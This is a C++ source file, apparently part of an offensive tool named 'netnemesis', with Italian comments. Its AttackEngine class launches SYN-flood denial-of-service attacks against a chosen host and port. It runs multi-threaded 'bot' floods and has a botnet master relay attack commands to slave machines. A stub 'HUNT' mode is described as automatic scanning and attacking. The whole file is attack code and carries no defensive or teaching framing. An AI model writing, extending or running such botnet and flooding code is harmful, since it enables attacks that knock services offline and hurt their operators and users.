#include "netnemesis.h"

AttackEngine::AttackEngine(BotnetManager *bm) : botnet(bm) {}

void AttackEngine::executeDOS(const std::string &target, int port, bool use_raw) {
    Utils::animateAttack("DOS", target + ":" + std::to_string(port));
    
    if (use_raw) {
        packet_crafter.sendSYNFlood(target, port, 1000);
    }
    
    // Se siamo master, invia automaticamente agli slave
    if (botnet && botnet->isMaster()) {
        std::string cmd = "DOS " + target + " " + std::to_string(port);
        botnet->broadcastToSlaves(cmd);
    }
}

void AttackEngine::executeDDOS(const std::string &target, int port, int bots) {
    Utils::animateAttack("DDOS", target + ":" + std::to_string(port) + " [Bots: " + std::to_string(bots) + "]");
    
    // Lancia attacchi multi-threaded
    std::vector<std::thread> threads;
    for (int i = 0; i < bots; i++) {
        threads.emplace_back([this, target, port]() {
            packet_crafter.sendSYNFlood(target, port, 100);
        });
    }
    
    for (auto &t : threads) {
        if (t.joinable()) t.join();
    }
    
    // Broadcast a slave se master
    if (botnet && botnet->isMaster()) {
        std::string cmd = "DOS " + target + " " + std::to_string(port);
        botnet->broadcastToSlaves(cmd);
    }
}

void AttackEngine::executeHunt() {
    Utils::logWarning("Modalità HUNT attiva - Scansione e attacco automatico");
    // Implementazione scanner + attacco automatico
}